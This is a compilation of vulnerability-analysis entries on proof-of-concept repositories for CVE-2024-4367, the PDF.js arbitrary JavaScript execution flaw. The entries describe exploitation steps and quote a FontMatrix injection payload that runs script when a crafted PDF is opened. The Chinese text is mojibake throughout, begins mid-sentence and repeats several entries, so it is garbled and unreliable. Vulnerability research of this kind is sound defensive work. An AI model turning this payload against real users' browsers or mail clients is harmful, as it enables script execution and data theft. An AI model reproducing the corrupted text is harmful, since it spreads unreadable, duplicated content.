æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç 